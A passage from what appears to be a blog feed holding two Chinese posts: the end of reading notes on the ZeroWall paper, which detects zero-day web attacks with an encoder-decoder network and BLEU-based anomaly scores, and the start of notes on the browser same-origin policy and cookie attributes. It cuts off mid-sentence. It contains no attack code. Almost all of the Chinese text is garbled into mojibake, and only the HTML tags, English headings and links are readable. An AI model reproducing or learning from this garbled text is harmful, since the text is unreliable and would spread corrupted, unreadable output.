è‡ªåŠ¨ç¼–ç å™¨çš„æ— ç›‘ç£æ–¹æ³•æ¥å­¦ä¹ HTTPè¯·æ±‚ã€‚ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•ç›´æ¥ä½¿ç”¨ç¼–ç å™¨è¾“å‡ºï¼ˆé™ç»´ï¼‰ç»“æœè¿›è¡Œå¼‚å¸¸æ£€æµ‹ï¼Œè¿™å¯èƒ½å¯¼è‡´å¼‚å¸¸æ ·æœ¬çš„è¾“å‡ºä¸æ­£å¸¸æ ·æœ¬æ— æ³•åŒºåˆ†ï¼Œä»è€Œé™åˆ¶äº†æ€§èƒ½ã€‚</li></ul><h2 id="Core-Idea"><a href="#Core-Idea" class="headerlink" title="Core Idea"></a>Core Idea</h2><p><img src="/2024/09/20/PaperReading/ZeroWall/image.png"><br>åœ¨è¿™ç¯‡è®ºæ–‡çš„â€æ ¸å¿ƒæ€æƒ³å’Œç³»ç»Ÿæ¦‚è¿°ï¼ˆCORE IDEA AND SYSTEM OVERVIEWï¼‰â€éƒ¨åˆ†ï¼Œä½œè€…è¯¦ç»†ä»‹ç»äº†ZeroWallçš„è®¾è®¡ç›®æ ‡ã€æ ¸å¿ƒæ€æƒ³å’Œæ•´ä½“æ¶æ„ã€‚è¿™ä¸€éƒ¨åˆ†å†…å®¹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</p><h3 id="è®¾è®¡ç›®æ ‡"><a href="#è®¾è®¡ç›®æ ‡" class="headerlink" title="è®¾è®¡ç›®æ ‡"></a>è®¾è®¡ç›®æ ‡</h3><ol><li><strong>ä¸ç°æœ‰WAFååŒå·¥ä½œ</strong>ï¼šZeroWallæ—¨åœ¨ä½œä¸ºç°æœ‰åŸºäºç­¾åçš„Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰çš„è¡¥å……ï¼Œè€Œä¸æ˜¯å®Œå…¨å–ä»£å®ƒä»¬ã€‚è¿™ç§è®¾è®¡å…è®¸ZeroWallåœ¨ä¸å¢åŠ é¢å¤–å¼€é”€çš„æƒ…å†µä¸‹ï¼Œä¸WAFä¸€èµ·éƒ¨ç½²ï¼Œå…±åŒæé«˜Webå®‰å…¨ã€‚</li><li><strong>æ£€æµ‹å•ä¸ªHTTPè¯·æ±‚ä¸­çš„é›¶æ—¥Webæ”»å‡»</strong>ï¼šZeroWallé€‰æ‹©ä½¿ç”¨æ— ç›‘ç£æ–¹æ³•ï¼Œå› ä¸ºå®ƒä¸éœ€è¦äº‹å…ˆçŸ¥é“æ”»å‡»çš„ç¡®åˆ‡æ¨¡å¼ï¼Œå› æ­¤æ¯”æœ‰ç›‘ç£æ–¹æ³•æ›´æœ‰æ½œåŠ›æ£€æµ‹åˆ°é›¶æ—¥æ”»å‡»ã€‚</li></ol><h3 id="æ ¸å¿ƒæ€æƒ³"><a href="#æ ¸å¿ƒæ€æƒ³" class="headerlink" title="æ ¸å¿ƒæ€æƒ³"></a>æ ¸å¿ƒæ€æƒ³</h3><ol><li><strong>åŸºäºå¼‚å¸¸æ£€æµ‹çš„æ— ç›‘ç£æ–¹æ³•</strong>ï¼šZeroWallçš„è®­ç»ƒæ•°æ®æ¥è‡ªäºWAFå…è®¸çš„å†å²Webè¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚å¤§å¤šæ•°è¢«è®¤ä¸ºæ˜¯è‰¯æ€§çš„ã€‚ä½œè€…ä½¿ç”¨ç¼–ç å™¨-è§£ç å™¨å¾ªç¯ç¥ç»ç½‘ç»œä½œä¸ºåŸºç¡€è®­ç»ƒç®—æ³•ï¼Œè¿™äº›ç½‘ç»œåœ¨è®­ç»ƒè¶³å¤Ÿçš„å¥å­åèƒ½å¤Ÿâ€œç†è§£â€è¿™ç§è¯­è¨€ï¼Œä»è€Œå¯ä»¥å°†è¾“å…¥å¥å­ç¿»è¯‘æˆæ½œåœ¨çš„è¡¨ç¤ºï¼Œç„¶åå†ç¿»è¯‘å›åŸè¯­è¨€ã€‚</li><li><strong>å°†é›¶æ—¥Webæ”»å‡»æ£€æµ‹é—®é¢˜è½¬åŒ–ä¸ºæœºå™¨ç¿»è¯‘è´¨é‡è¯„ä¼°é—®é¢˜</strong>ï¼šZeroWallçš„æ ¸å¿ƒè§‚å¯Ÿæ˜¯ï¼ŒHTTPè¯·æ±‚éµå¾ªHTTPåè®®ï¼Œå¯ä»¥è¢«è§†ä¸ºâ€œHTTPè¯·æ±‚è¯­è¨€â€ä¸­çš„ä¸€å¥è¯ã€‚é€šè¿‡è®­ç»ƒï¼Œç½‘ç»œèƒ½å¤Ÿå°†è‰¯æ€§è¾“å…¥Webè¯·æ±‚â€œç¿»è¯‘â€æˆæ½œåœ¨è¡¨ç¤ºï¼Œç„¶åâ€œç¿»è¯‘â€å›æ¥è¿‘åŸå§‹è¯·æ±‚çš„è¾“å‡ºWebè¯·æ±‚ã€‚å¦‚æœç¿»è¯‘è´¨é‡é«˜ï¼Œè¯·æ±‚åˆ™è¢«è®¤ä¸ºæ˜¯è‰¯æ€§çš„ï¼›å¦åˆ™ï¼Œè¢«è®¤ä¸ºæ˜¯æ”»å‡»ã€‚</li></ol><h3 id="ç³»ç»Ÿæ¦‚è¿°"><a href="#ç³»ç»Ÿæ¦‚è¿°" class="headerlink" title="ç³»ç»Ÿæ¦‚è¿°"></a>ç³»ç»Ÿæ¦‚è¿°</h3><ol><li><strong>ç¦»çº¿å®šæœŸé‡æ–°è®­ç»ƒ</strong>ï¼šå®šæœŸï¼ˆä¾‹å¦‚ï¼Œæ¯å¤©ï¼‰æˆ–æ‰‹åŠ¨è§¦å‘ç¦»çº¿è®­ç»ƒï¼Œä»¥åˆ©ç”¨æœ€æ–°WAFè§„åˆ™è¿‡æ»¤çš„æœ€æ–°è¯·æ±‚æ•°æ®ã€‚è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬æ„å»ºè¯æ±‡è¡¨ã€å°†HTTPè¯·æ±‚æ—¥å¿—è½¬æ¢ä¸ºä»¤ç‰Œåºåˆ—ï¼Œå¹¶è®­ç»ƒç¼–ç å™¨-è§£ç å™¨ç¥ç»ç½‘ç»œã€‚</li><li><strong>åœ¨çº¿æ£€æµ‹</strong>ï¼šåœ¨çº¿æ£€æµ‹é˜¶æ®µï¼ŒZeroWallå®æ—¶æ£€æµ‹HTTPè¯·æ±‚æ˜¯å¦ä¸ºè‰¯æ€§æˆ–æ¶æ„ï¼ˆå³é›¶æ—¥æ”»å‡»ï¼‰ã€‚è¿™ä¸ªé˜¶æ®µåŒ…æ‹¬ä»¤ç‰Œè§£æå™¨ã€ç¼–ç å™¨-è§£ç å™¨ç½‘ç»œã€å¼‚å¸¸æ£€æµ‹å’Œæ‰‹åŠ¨è°ƒæŸ¥ç­‰ç»„ä»¶ã€‚ç»™å®šä¸€ä¸ªHTTPè¯·æ±‚ä½œä¸ºè¾“å…¥ï¼ŒZeroWallé¦–å…ˆä½¿ç”¨ç¦»çº¿æ„å»ºçš„è¯æ±‡è¡¨å°†è¯·æ±‚è½¬æ¢ä¸ºä»¤ç‰Œåºåˆ—ï¼Œç„¶åç¼–ç å™¨-è§£ç å™¨ç½‘ç»œé‡å»ºæ¢å¤çš„ä»¤ç‰Œåºåˆ—ã€‚å¼‚å¸¸æ£€æµ‹ç»„ä»¶é€šè¿‡è®¡ç®—åŸå§‹å’Œæ¢å¤ä»¤ç‰Œåºåˆ—ä¹‹é—´çš„BLEUåˆ†æ•°æ¥å†³å®šè¯·æ±‚æ˜¯è‰¯æ€§è¿˜æ˜¯æ¶æ„çš„ã€‚</li><li><strong>æ‰‹åŠ¨è°ƒæŸ¥</strong>ï¼šä¸ºäº†å¤„ç†æ— ç›‘ç£å¼‚å¸¸æ£€æµ‹å¯èƒ½äº§ç”Ÿçš„è¯¯æŠ¥ï¼Œè¢«æ ‡è®°ä¸ºâ€œæ¶æ„â€çš„è¯·æ±‚å°†ç”±å®‰å…¨å·¥ç¨‹å¸ˆæ‰‹åŠ¨è°ƒæŸ¥ã€‚ç¡®è®¤çš„è¯¯æŠ¥å°†è¢«åŠ å…¥ç™½åå•ï¼Œä»¥é¿å…æœªæ¥å› ç›¸åŒæ¨¡å¼çš„è¯·æ±‚è€Œäº§ç”Ÿçš„è¯¯æŠ¥ã€‚ç¡®è®¤çš„çœŸå®é›¶æ—¥æ”»å‡»å°†ç”¨äºæ›´æ–°WAFè§„åˆ™ã€‚</li></ol><h2 id="DESIGN-DETAILS"><a href="#DESIGN-DETAILS" class="headerlink" title="DESIGN DETAILS"></a>DESIGN DETAILS</h2><h3 id="A-Token-Parserï¼ˆä»¤ç‰Œè§£æå™¨ï¼‰"><a href="#A-Token-Parserï¼ˆä»¤ç‰Œè§£æå™¨ï¼‰" class="headerlink" title="A. Token Parserï¼ˆä»¤ç‰Œè§£æå™¨ï¼‰"></a>A. Token Parserï¼ˆä»¤ç‰Œè§£æå™¨ï¼‰</h3><p>Token Parserè´Ÿè´£å°†HTTPè¯·æ±‚å­—ç¬¦ä¸²è½¬æ¢ä¸ºä»¤ç‰Œåºåˆ—ã€‚è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬ä¸‰ä¸ªä¸»è¦æ­¥éª¤ï¼š</p><ol><li><strong>æ„å»ºè¯æ±‡è¡¨ï¼ˆVocabularyï¼‰</strong>ï¼šé¦–å…ˆï¼Œç³»ç»Ÿé€šè¿‡åˆ†éš”ç¬¦ï¼ˆå¦‚æ ‡ç‚¹å’Œç©ºæ ¼ï¼‰å°†è¯·æ±‚å­—ç¬¦ä¸²åˆ†å‰²æˆå¤šä¸ªâ€œå•è¯â€ã€‚ç„¶åï¼Œè¿‡æ»¤æ‰æ— ç”¨çš„è¯ï¼ˆå¦‚å˜é‡å’Œåœç”¨è¯ï¼‰ï¼Œå¹¶ä½¿ç”¨è¯åµŒå…¥æŠ€æœ¯æ¥è¡¨ç¤ºè¿™äº›è¯ã€‚è¯æ±‡è¡¨ä¸­çš„æ¯ä¸ªè¯éƒ½ä¸ä¸€ä¸ªå”¯ä¸€çš„æ ‡è®°IDå…³è”ã€‚</li><li><strong>ç”Ÿæˆä»¤ç‰Œåºåˆ—ï¼ˆToken Sequenceï¼‰</strong>ï¼šä¸€æ—¦è¯æ±‡è¡¨æ„å»ºå®Œæˆï¼Œç³»ç»Ÿå°±å¯ä»¥å°†è¯·æ±‚è½¬æ¢ä¸ºä»¤ç‰Œåºåˆ—ã€‚è¿™ä¸ªè¿‡ç¨‹é€šè¿‡ä¿ç•™è¯æ±‡è¡¨ä¸­çš„è¯å¹¶è¿‡æ»¤æ‰å…¶ä»–è¯æ¥å®Œæˆã€‚ä¾‹å¦‚ï¼Œå˜é‡å’Œåœç”¨è¯è¢«æ›¿æ¢ä¸ºå ä½ç¬¦ã€‚</li><li><strong>ä»¤ç‰ŒåµŒå…¥ï¼ˆToken Embeddingï¼‰</strong>ï¼šæ¯ä¸ªä»¤ç‰Œç”±å…¶åœ¨è¯æ±‡è¡¨ä¸­çš„IDè¡¨ç¤ºï¼Œè¿™å¯èƒ½ä¼šå¿½ç•¥ä»¤ç‰Œçš„å«ä¹‰ã€‚å› æ­¤ï¼Œç³»ç»Ÿæ·»åŠ äº†ä¸€ä¸ªåµŒå…¥å±‚ï¼Œå°†è¿™äº›æ ‡è®°IDæ˜ å°„åˆ°æ½œåœ¨çš„å‘é‡ç©ºé—´ä¸­ï¼Œä½¿ç”¨å‘é‡ä¹‹é—´çš„è·ç¦»æ¥è¡¨ç¤ºå®ƒä»¬ä¹‹é—´çš„é€»è¾‘å…³ç³»ã€‚</li></ol><h3 id="B-Encoder-Decoder-Networkï¼ˆç¼–ç å™¨-è§£ç å™¨ç½‘ç»œï¼‰"><a href="#B-Encoder-Decoder-Networkï¼ˆç¼–ç å™¨-è§£ç å™¨ç½‘ç»œï¼‰" class="headerlink" title="B. Encoder-Decoder Networkï¼ˆç¼–ç å™¨-è§£ç å™¨ç½‘ç»œï¼‰"></a>B. Encoder-Decoder Networkï¼ˆç¼–ç å™¨-è§£ç å™¨ç½‘ç»œï¼‰</h3><p>ç¼–ç å™¨-è§£ç å™¨ç½‘ç»œçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯å°†ä¸€ä¸ªåºåˆ—æ˜ å°„åˆ°å¦ä¸€ä¸ªåºåˆ—ã€‚åœ¨ZeroWallä¸­ï¼Œè¾“å…¥æ˜¯åŸå§‹ä»¤ç‰Œåºåˆ—ï¼Œè¾“å‡ºæ˜¯ç½‘ç»œå­¦ä¹ åé‡å»ºçš„ä»¤ç‰Œåºåˆ—ã€‚</p><ol><li><strong>ç¼–ç å™¨ï¼ˆEncoderï¼‰</strong>ï¼šç¼–ç å™¨æ˜¯ä¸€ä¸ªLSTMï¼ˆé•¿çŸ­æœŸè®°å¿†ï¼‰ç½‘ç»œï¼Œå®ƒè¯»å–ä»¤ç‰Œåºåˆ—å¹¶æ„å»ºä¸€ä¸ªå›ºå®šç»´åº¦çš„å‘é‡æ¥è¡¨ç¤ºåŸå§‹åºåˆ—ã€‚</li><li><strong>è§£ç å™¨ï¼ˆDecoderï¼‰</strong>ï¼šè§£ç å™¨æ˜¯å¦ä¸€ä¸ªLSTMç½‘ç»œï¼Œå®ƒä½¿ç”¨ç¼–ç å™¨çš„è¡¨ç¤ºæ¥è®¡ç®—è¾“å‡ºåºåˆ—çš„æ¦‚ç‡ã€‚è§£ç å™¨çš„è¾“å‡ºæ˜¯ä¸€ä¸ªæ¦‚ç‡å‘é‡ï¼Œæ¯ä¸ªå…ƒç´ ä»£è¡¨è¯æ±‡è¡¨ä¸­æŸä¸ªæ ‡è®°çš„æ¦‚ç‡ã€‚è§£ç å™¨é€‰æ‹©æ¦‚ç‡æœ€é«˜çš„æ ‡è®°ä½œä¸ºè¾“å‡ºã€‚</li><li><strong>é‡å»ºï¼ˆReconstructionï¼‰</strong>ï¼šç½‘ç»œè¯•å›¾ä½¿ç”¨ç›¸åŒçš„è¯æ±‡è¡¨ä¸­çš„æ ‡è®°é‡å»ºåŸå§‹ä»¤ç‰Œåºåˆ—ï¼Œè¿™ä»£è¡¨äº†ç›¸åŒçš„ä¿¡æ¯ã€‚é‡å»ºçš„åºåˆ—ä¸åŸå§‹åºåˆ—ä¹‹é—´çš„å·®å¼‚ç”¨äºåç»­çš„å¼‚å¸¸æ£€æµ‹ã€‚</li></ol><h3 id="C-Anomaly-Detectionï¼ˆå¼‚å¸¸æ£€æµ‹ï¼‰"><a href="#C-Anomaly-Detectionï¼ˆå¼‚å¸¸æ£€æµ‹ï¼‰" class="headerlink" title="C. Anomaly Detectionï¼ˆå¼‚å¸¸æ£€æµ‹ï¼‰"></a>C. Anomaly Detectionï¼ˆå¼‚å¸¸æ£€æµ‹ï¼‰</h3><p>å¼‚å¸¸æ£€æµ‹çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œç¼–ç å™¨-è§£ç å™¨ç½‘ç»œèƒ½å¤Ÿæ›´å‡†ç¡®åœ°é‡å»ºè‰¯æ€§ä»¤ç‰Œåºåˆ—ã€‚å¯¹äºé›¶æ—¥Webæ”»å‡»è¯·æ±‚ï¼Œç½‘ç»œè¾“å‡ºå°†ä¸è¾“å…¥å¤§ç›¸å¾„åº­ã€‚ä¸ºäº†è¿›è¡Œå¼‚å¸¸æ£€æµ‹ï¼Œç³»ç»Ÿæ¯”è¾ƒåŸå§‹ä»¤ç‰Œåºåˆ—å’Œæ¢å¤ä»¤ç‰Œåºåˆ—ä¹‹é—´çš„ç›¸ä¼¼æ€§ï¼Œå¹¶å°†å…¶ç”¨ä½œå¼‚å¸¸æŒ‡æ ‡ã€‚</p><ol><li><strong>ä½¿ç”¨BLEUæŒ‡æ ‡</strong>ï¼šBLEUï¼ˆBilingual Evaluation Understudyï¼‰æŒ‡æ ‡ç”¨äºè®¡ç®—ä¸¤ä¸ªåºåˆ—ä¹‹é—´çš„ç›¸ä¼¼åº¦ã€‚BLEUå€¼èŒƒå›´ä»0åˆ°1ï¼Œå€¼è¶Šé«˜è¡¨ç¤ºæºåºåˆ—å’Œç›®æ ‡åºåˆ—ä¹‹é—´çš„ç›¸ä¼¼åº¦è¶Šé«˜ã€‚</li><li><strong>æ¶æ„åˆ†æ•°ï¼ˆMalicious Scoreï¼‰</strong>ï¼šä¸ºäº†æ£€æµ‹å¼‚å¸¸ï¼Œç³»ç»Ÿå®šä¹‰äº†æ¶æ„åˆ†æ•°ï¼ˆ1 - BLEUï¼‰ä½œä¸ºä¼°è®¡å™¨ã€‚è¾ƒé«˜çš„æ¶æ„åˆ†æ•°æ„å‘³ç€ç½‘ç»œæ— æ³•é‡å»ºç»™å®šåºåˆ—ï¼Œè¡¨æ˜è¾“å…¥åºåˆ—å¯èƒ½æ˜¯æ¶æ„çš„ã€‚</li><li><strong>é˜ˆå€¼åˆ¤æ–­</strong>ï¼šæ¶æ„åˆ†æ•°ä¸ç‰¹å®šé˜ˆå€¼è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ç¡®å®šè¯·æ±‚æ˜¯è‰¯æ€§è¿˜æ˜¯æ¶æ„çš„ã€‚<br><img src="/2024/09/20/PaperReading/ZeroWall/image-1.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®ºæ–‡ç²¾è¯» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€webå®‰å…¨ã€‘æµè§ˆå™¨åŒæºç­–ç•¥å’Œè·¨åŸŸé—®é¢˜</title>
      <link href="/2024/09/20/WebSecurity/owasptop/browserorigin/"/>
      <url>/2024/09/20/WebSecurity/owasptop/browserorigin/</url>
      
        <content type="html"><![CDATA[<p>å†™è¿™ç¯‡ç¬”è®°çš„æƒ³æ³•æ˜¯ä¹‹å‰çœ‹ç™½å¸½å­è®²webå®‰å…¨çš„æ—¶å€™ï¼Œå°±çœ‹åˆ°æœ‰å…³æµè§ˆå™¨å¯¹åŸŸé‡‡å–çš„ä¸€ç³»åˆ—å®‰å…¨æªæ–½ï¼Œå¦‚ï¼šåŒæºç­–ç•¥ç­‰ï¼Œåé¢ä¸ºäº†æ–¹ä¾¿webåº”ç”¨æœ‰åœ¨æ•°æ®åŒ…headerä¸­æ·»åŠ å­—æ®µï¼Œä½†ä¹Ÿå¸¦æ¥äº†å¾ˆå¤šé£é™©ã€‚<br>åœ¨è¿™ä¸€èƒŒæ™¯ä¸‹æƒ³è¦ç³»ç»Ÿæ•´ç†ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†<br>å‚è€ƒåšå®¢ï¼š<a href="https://www.freebuf.com/articles/web/208672.html">https://www.freebuf.com/articles/web/208672.html</a><br><a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>æ‰¾åˆ°2017å¹´çš„ä¸€ç¯‡è®ºæ–‡ï¼šSame-Origin Policy: Evaluation in Modern Browsersï¼Œå‘åœ¨é¡¶ä¼šä¸Šçš„</p><p>ä¸ªäººç†è§£çš„åŸŸå’Œæºæœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åŸŸæ˜¯é’ˆå¯¹å•ä¸ªçš„ï¼Œè€Œæœ‰æºå°±è¦æœ‰æ±‡ï¼Œæ˜¯é’ˆå¯¹åŒæ–¹çš„ã€‚åœ¨æµè§ˆå™¨çš„ä¸Šä¸‹æ–‡ä¸­ï¼ŒåŸŸï¼ˆDomainï¼‰ æ˜¯ä¸€ç§å®‰å…¨æ¨¡å‹çš„åŸºç¡€æ„ä»¶ï¼Œä¸»è¦ç”¨æ¥ç¡®å®šå“ªäº›ç½‘ç»œèµ„æºï¼ˆå¦‚ç½‘é¡µã€å›¾ç‰‡ã€è„šæœ¬ç­‰ï¼‰å¯ä»¥ä¸å“ªäº›å…¶ä»–èµ„æºäº’ç›¸äº¤äº’ã€‚è€ŒåŸŸçš„æ¦‚å¿µæ˜¯ä¸ºäº†å®ç° Web å®‰å…¨è€Œè®¾è®¡çš„ï¼Œä¸»è¦ç›®çš„æ˜¯é˜²æ­¢æ¶æ„ç½‘ç«™è®¿é—®æˆ–æ“ä½œå…¶ä»–ç½‘ç«™çš„æ•°æ®ï¼Œè¿™ç§å®‰å…¨ç­–ç•¥è¢«ç§°ä¸ºåŒæºæ”¿ç­–ï¼ˆSame-Origin Policy, SOPï¼‰ï¼ˆæ˜¯ç”± Netscape æå‡ºçš„ä¸€ä¸ªè‘—åçš„å®‰å…¨ç­–ç•¥ï¼Œç°åœ¨æ‰€æœ‰æ”¯æŒ JavaScript çš„æµè§ˆå™¨éƒ½ä¼šä½¿ç”¨è¿™ä¸ªç­–ç•¥ã€‚ï¼‰</p><p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image.png"></p><p>æµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼šå¯¹äºWebé¡µé¢ä¸Šçš„è„šæœ¬æ¥è¯´ï¼Œåªèƒ½è®¿é—®æ¥è‡ªåŒä¸€æ¥æºçš„æ•°æ®ï¼Œè€Œä¸èƒ½è®¿é—®æˆ–ä¿®æ”¹ä¸åŒæ¥æºçš„æ•°æ®ã€‚è¿™é‡Œçš„â€œæ¥æºâ€ï¼ˆoriginï¼‰æ˜¯ç”±åè®®ï¼ˆprotocolï¼‰ã€åŸŸåï¼ˆdomainï¼‰å’Œç«¯å£ï¼ˆportï¼‰ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆçš„ã€‚åªæœ‰å½“è¿™ä¸‰è€…å®Œå…¨ç›¸åŒçš„æ—¶å€™ï¼Œä¸¤ä¸ªèµ„æºæ‰è¢«è®¤ä¸ºæ˜¯â€œåŒæºâ€çš„ã€‚<br>è™½ç„¶æµè§ˆå™¨ä¸ºäº†å®‰å…¨ç›®çš„å¼•å…¥äº†åŒæºæ”¿ç­–ï¼Œä½†åŒæ—¶ä¹Ÿç»™å¼€å‘è€…ä»¬å¸¦æ¥å¾ˆå¤šé—®é¢˜ï¼Œè¿™ä¹Ÿå‚¬ç”Ÿå‡ºäº†å¾ˆå¤šçš„è·¨åŸŸæ‰‹æ®µï¼Œå¸¦æ¥äº†æ–°çš„æ”»å‡»é¢ã€‚</p><p>â‘ .<a href="https://blog.csdn.net/bestxianfeng163/article/details/105666140">æµè§ˆå™¨</a>å…ˆæ ¹æ®åŒæºç­–ç•¥å¯¹å‰ç«¯é¡µé¢å’Œåå°äº¤äº’åœ°å€åšåŒ¹é…ï¼Œè‹¥åŒæºï¼Œåˆ™ç›´æ¥å‘é€æ•°æ®è¯·æ±‚ï¼›è‹¥ä¸åŒæºï¼Œåˆ™å‘é€è·¨åŸŸè¯·æ±‚ã€‚<br>â‘¡.æœåŠ¡å™¨è§£æç¨‹åºæ”¶åˆ°æµè§ˆå™¨è·¨åŸŸè¯·æ±‚åï¼Œæ ¹æ®è‡ªèº«é…ç½®è¿”å›å¯¹åº”æ–‡ä»¶å¤´ã€‚è‹¥æœªé…ç½®è¿‡ä»»ä½•å…è®¸è·¨åŸŸï¼Œåˆ™æ–‡ä»¶å¤´é‡Œä¸åŒ…å«Access-Control-Allow-originå­—æ®µï¼Œè‹¥é…ç½®è¿‡åŸŸåï¼Œåˆ™è¿”å›Access-Control-Allow-origin+ å¯¹åº”é…ç½®è§„åˆ™é‡Œçš„åŸŸåçš„æ–¹å¼ã€‚<br>â‘¢.æµè§ˆå™¨æ ¹æ®æ¥å—åˆ°çš„httpæ–‡ä»¶å¤´é‡Œçš„Access-Control-Allow-originå­—æ®µåšåŒ¹é…ï¼Œè‹¥æ— è¯¥å­—æ®µï¼Œè¯´æ˜ä¸å…è®¸è·¨åŸŸï¼›è‹¥æœ‰è¯¥å­—æ®µï¼Œåˆ™å¯¹å­—æ®µå†…å®¹å’Œå½“å‰åŸŸååšæ¯”å¯¹ï¼Œå¦‚æœåŒæºï¼Œåˆ™è¯´æ˜å¯ä»¥è·¨åŸŸï¼Œæµè§ˆå™¨å‘é€è¯¥è¯·æ±‚ï¼›è‹¥ä¸åŒæºï¼Œåˆ™è¯´æ˜è¯¥åŸŸåä¸å¯è·¨åŸŸï¼Œä¸å‘é€è¯·æ±‚</p><h2 id="Cookieçš„è·¨åŸŸé—®é¢˜"><a href="#Cookieçš„è·¨åŸŸé—®é¢˜" class="headerlink" title="Cookieçš„è·¨åŸŸé—®é¢˜"></a>Cookieçš„è·¨åŸŸé—®é¢˜</h2><p>åœ¨Cookieè®¾ç½®ä¸­æœ‰å¾ˆå¤š<a href="https://blog.csdn.net/qq_51383106/article/details/131458419">å±æ€§</a></p><table><thead><tr><th>åç§°</th><th>Cookieçš„name</th></tr></thead><tbody><tr><td>å€¼</td><td>Cookieçš„value</td></tr><tr><td>Domain</td><td>Cookieçš„åŸŸã€‚å¦‚æœè®¾æˆ xxx.com(ä¸€çº§åŸŸå)ï¼Œé‚£ä¹ˆå­åŸŸåx.xxx.com(äºŒçº§åŸŸå)ï¼Œéƒ½å¯ä»¥ä½¿ç”¨xxx.comçš„Cookie</td></tr><tr><td>Path</td><td>Cookieçš„è·¯å¾„ã€‚å¦‚æœè®¾ä¸º&#x2F;ï¼Œåˆ™åŒåŸŸåå…¨éƒ¨è·¯å¾„å‡å¯ä½¿ç”¨è¯¥Cookieã€‚å¦‚æœè®¾ä¸º&#x2F;xxx&#x2F;ï¼Œåˆ™åªæœ‰è·¯å¾„ä¸º&#x2F;xxx&#x2F;å¯ä»¥ä½¿ç”¨è¯¥Cookieã€‚</td></tr><tr><td>Expires &#x2F; Max-Age</td><td>Cookieçš„è¶…æ—¶æ—¶é—´ã€‚å¦‚æœå€¼ä¸ºæ—¶é—´ï¼Œåˆ™åœ¨åˆ°è¾¾æŒ‡å®šæ—¶é—´åCookieå¤±æ•ˆã€‚å¦‚æœå€¼ä¸ºSession(ä¼šè¯)ï¼ŒCookieä¼šåŒSessionä¸€èµ·å¤±æ•ˆï¼Œå½“æ•´ä¸ªæµè§ˆå™¨å…³é—­çš„æ—¶å€™Cookieå¤±æ•ˆã€‚</td></tr><tr><td>Size</td><td>Cookieçš„å¤§å°ã€‚</td></tr><tr><td>HttpOnly</td><td>å€¼ä¸ºtrueæ—¶ï¼ŒCookieåªä¼šåœ¨Httpè¯·æ±‚å¤´ä¸­å­˜åœ¨ï¼Œä¸èƒ½é€šè¿‡doucment.cookie(JavaScript)è®¿é—®Cookieã€‚</td></tr><tr><td>Secure</td><td>å€¼ä¸ºtrueæ—¶ï¼Œåªèƒ½é€šè¿‡httpsæ¥ä¼ è¾“Cookieã€‚</td></tr><tr><td>SameSite</td><td>å€¼ä¸ºStrictï¼Œå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹Cookieï¼Œè·¨ç«™æ—¶æ— æ³•ä½¿ç”¨Cookieã€‚å€¼ä¸ºLaxï¼Œå…è®¸åœ¨è·¨ç«™æ—¶ä½¿ç”¨Getè¯·æ±‚æºå¸¦Cookieï¼Œä¸‹é¢æœ‰ä¸€ä¸ªè¡¨æ ¼ä»‹ç»Laxçš„Cookieä½¿ç”¨æƒ…å†µã€‚å€¼ä¸ºNoneï¼Œå…è®¸è·¨ç«™è·¨åŸŸä½¿ç”¨Cookieï¼Œå‰ææ˜¯å°†Secureå±æ€§è®¾ç½®ä¸ºtrueã€‚Priority ï¼šCookieçš„ä¼˜å…ˆçº§ã€‚å€¼ä¸ºLow&#x2F;Medium&#x2F;Highï¼Œå½“Cookieæ•°é‡è¶…å‡ºæ—¶ï¼Œä½ä¼˜å…ˆçº§çš„Cookieä¼šè¢«ä¼˜å…ˆæ¸…é™¤ã€‚</td></tr></tbody></table><p>é’ˆå¯¹ä¸Šé¢çš„å±æ€§ï¼Œå¦‚æœè®¾ç½®ä¸å½“ï¼Œå°±æœ‰å¯èƒ½å­˜åœ¨å®‰å…¨é—®é¢˜ï¼š<br>ä¸Šé¢çš„Cookieé…ç½®ä¸­æ¶‰åŠåˆ°å®‰å…¨æ€§çš„å±æ€§ä¸»è¦åŒ…æ‹¬Domainã€Pathã€HttpOnlyã€Secureå’ŒSameSiteã€‚æ¯ä¸ªå±æ€§çš„è®¾ç½®éƒ½ä¼šç›´æ¥å½±å“åˆ°Cookieçš„å®‰å…¨æ€§å’Œåº”ç”¨çš„å®‰å…¨é£é™©ã€‚ä¸‹é¢åˆ†åˆ«åˆ†æè¿™äº›å±æ€§å¯èƒ½å¼•èµ·çš„å®‰å…¨é—®é¢˜ï¼š</p><ol><li>Domainï¼ˆåŸŸï¼‰ï¼šå¦‚æœDomainè®¾ç½®ä¸å½“ï¼Œæ¯”å¦‚è®¾ç½®ä¸ºä¸€çº§åŸŸåï¼ˆä¾‹å¦‚<code>xxx.com</code>ï¼‰ï¼Œé‚£ä¹ˆæ‰€æœ‰xxx.comçš„å­åŸŸï¼ˆå¦‚<code>sub.xxx.com</code>ï¼‰éƒ½å¯ä»¥è®¿é—®è¿™ä¸ªCookieã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´Cookieè¢«ä¸å®‰å…¨çš„å­åŸŸè®¿é—®ï¼Œå¢åŠ æ•°æ®æ³„éœ²çš„é£é™©ã€‚ä¾æ®æœ€å°ç‰¹æƒåŸåˆ™ï¼Œå°½é‡å°†cookieä½œç”¨åŸŸè®¾ç½®çš„è¶Šå°è¶Šå¥½ã€‚</li><li>Pathï¼ˆè·¯å¾„ï¼‰ï¼šå¦‚æœPathè®¾ç½®ä¸ºæ 